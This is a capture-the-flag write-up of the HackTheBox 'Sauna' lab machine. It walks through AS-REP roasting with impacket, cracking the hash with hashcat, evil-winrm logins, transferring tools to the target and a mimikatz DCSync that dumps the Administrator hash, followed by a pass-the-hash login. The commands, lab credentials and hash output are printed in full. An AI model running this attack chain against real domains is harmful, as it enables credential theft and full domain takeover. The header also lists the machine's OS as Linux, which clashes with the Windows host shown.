# Sauna Writeup | HackTheBox

<pre>
</pre>

<p align="center">
    <img src="https://www.hackthebox.eu/storage/avatars/f31d5d0264fadc267e7f38a9d7729d14.png"/>
</p>

- OS: _Linux_
- Difficulty: _Easy_
- Creator: [_egotisticalSW_](https://www.hackthebox.eu/home/users/profile/94858)
- User blood: [_InfoSecJack_](https://www.hackthebox.eu/home/users/profile/52045)
- Root blood: [_x4nt0n_](https://www.hackthebox.eu/home/users/profile/38547)



Sauna was a easy hackthebox machine that involved some kerberoasting for user and running [mimikatz](https://github.com/gentilkiwi/mimikatz) and [winPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) for privilege escalation.



## Nmap

Firstly we run our nmap scan to see which ports are open. I am running the command:

```
nmap -sC -sV -v -oA nmap/sauna 10.10.10.175
```

And after that is done we can see the following output

```
Nmap scan report for 10.10.10.175
Host is up (0.16s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-18 18:54:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/18%Time=5F12E1B1%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h05m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-18T18:56:31
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 13:54
Completed NSE at 13:54, 0.00s elapsed
Initiating NSE at 13:54
Completed NSE at 13:54, 0.00s elapsed
Initiating NSE at 13:54
Completed NSE at 13:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 323.91 seconds
```

We see there are quite a few ports open but while trying to enumerate smb, ldap and rpc we don't get much information, so those are not needed right now. We also see that there is port 80 open so we head to the webpage. On the webpage while scrolling down we can see a couple of users listed

![Image](https://i.imgur.com/h7X1Lxe.png)

This can be useful to us because there is kerberos port open (88) and if we guess the username we can get the kerberos hash of the user and potentially crack it. Then I wrote this list of usernames to a file called usernames.txt

```
fergussmith
fsmith
shauncoins
scoins
hugobear
hbear
bowietaylor
btaylor
sophiedriver
sdriver
stevenkerb
sker
```



## Kerberoasting



There is a great article covering how we can attack kerberos: [Link](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

After we wrote the file usernames.txt we can run [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script from [impacket](https://github.com/SecureAuthCorp/impacket) with the command:

```
python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames.txt -format hashcat -dc-ip 10.10.10.175
```

And by running that command we got the kerberos hash successfully for username fsmith.

![Image](https://i.imgur.com/wWed1vK.png)

The kerberos hash:

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:47e3f2fc0835e874173f341e1a542071$8837c2bdc1f635ce6d1d18425da163f149e1993174a26f4d0e541c74c0531436e8d48dcd691549ff232d5fde7f5c531ec757cbaffccfd90eaa0612f63ad82e937798ed699f105a1c7a441c133e80c9e24d8727af5caff2fbd1815381e6356008530e5750e0f8a9a9cb8695f20cdfcdb11d130da3a228f6d2838b1db59ed26ec8fb37d5ff88cb0f8b3bd0b70eea638eb89e089c6051ab6915304164a4a6b06e10c5f3e3730a996222636728d5e23f7b84a7629996c5995748f83ebd1828d97ecbea72ad1b41cb4ddb826c54357580512a7a020b66e0f5e90d7ff63674c1f2afc7bd942937bc26ed7481f5c3e2ffe90160e9845a59feaebfd686bcae20a5b2f506
```

We can save that hash to a file called hash.txt and run hashcat with rockyou.txt against it

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

And after a couple of seconds it gets cracked!

![Image](https://i.imgur.com/LxgWoh9.png)

The password is:

```
Thestrokes23
```

We can login to user `fsmith` using [evil-winrm](https://github.com/Hackplayers/evil-winrm) and the command:

```
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```



## Privilege Escalation



After we are logged in we can transfer [winPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) script to the box, to do that there is a command `upload` built in evil-winrm but I have some problems using that sometimes so I just do it with python and powershell. Python is used to start a webserver on our machine and powershell to make a request to download the file from our machine to the box. The command we need to run on our machine is:

```
sudo python3 -m http.server 80
```

After we have done that we can go to our evil-winrm session as `fsmith` user and run:

```
Invoke-WebRequest -Uri http://<your tun0 ip>/winPeas.exe -OutFile winPeas.exe
```

When thats done we can simply run it and in the output we see that it found some logon passwords

![Image](https://i.imgur.com/0va33vB.png)

We see the password is `Moneymakestheworldgoround!` and we can use it to login to next user, we again use evil-winrm for that.

```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

After we are logged in we can try running [mimikatz](https://github.com/gentilkiwi/mimikatz) with the command of:

```
.\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
```

But to run it we first need to transfer it and we do that just like we did winPeas. After running the mimikatz command we can see the following output:

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
ERROR kuhl_m_lsadump_dcsync ; Missing user or guid argument

mimikatz(commandline) # exit
Bye!
*Evil-WinRM* PS C:\Temp> .\mimi.exe "lsadump::dcsync /user:Administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : caab2b641b39e342e0bdfcd150b1683e

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       (4096) : 19d5f15d689b1ce5
    OldCredentials
      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       (4096) : d9379d13f7c15d1c

* Primary:Kerberos *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : 19d5f15d689b1ce5
    OldCredentials
      des_cbc_md5       : d9379d13f7c15d1c

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  3fbea1ff422da035f1dc9b0ce45e84ea
    02  708091daa9db25abbd1d94246e4257e2
    03  417f2e40d5be8d436af749ed9fddb0b0
    04  3fbea1ff422da035f1dc9b0ce45e84ea
    05  50cb7cfb64edf83218804d934e30d431
    06  781dbcf7b8f9079382a1948f26f561ee
    07  4052111530264023a7d445957f5146e6
    08  8f4bffc5d94cc294272cd0c836e15c47
    09  0c81bc892ea87f7dd0f4a3a05b51f158
    10  f8c10a5bd37ea2568976d47ef12e55b9
    11  8f4bffc5d94cc294272cd0c836e15c47
    12  023b04503e3eef421de2fcaf8ba1297d
    13  613839caf0cf709da25991e2e5cb63cf
    14  16974c015c9905fb27e55a52dc14dfb0
    15  3c8af7ccd5e9bd131849990d6f18954b
    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
    17  6eeda5f64e4adef4c299717eafbd2850
    18  3b32ec94978feeac76ba92b312114e2c
    19  b25058bc1ebfcac10605d39f65bff67f
    20  89e75cc6957728117eb1192e739e5235
    21  7e6d891c956f186006f07f15719a8a4e
    22  a2cada693715ecc5725a235d3439e6a2
    23  79e1db34d98ccd050b493138a3591683
    24  1f29ace4f232ebce1a60a48a45593205
    25  9233c8df5a28ee96900cc8b59a731923
    26  08c02557056f293aab47eccf1186c100
    27  695caa49e68da1ae78c1523b3442e230
    28  57d7b68bd2f06eae3ba10ca342e62a78
    29  3f14bb208435674e6a1cb8a957478c18


mimikatz(commandline) # exit
Bye!
```

Mimikatz got the NTLM hash for user Administrator which we can use upon logging in without the need of the users password. The NTLM hash:

```
d9485863c1e9e05851aa40cbb4ab9dff
```

And once again evil-winrm is useful here

```
evil-winrm -i 10.10.10.175 -H d9485863c1e9e05851aa40cbb4ab9dff -u Administrator
```

And we successfully root the box!

<pre>
</pre>

# Contact

- Twitter: [_ryaagard_](https://twitter.com/ryaagard)
- Discord: _ryaagard#5027_



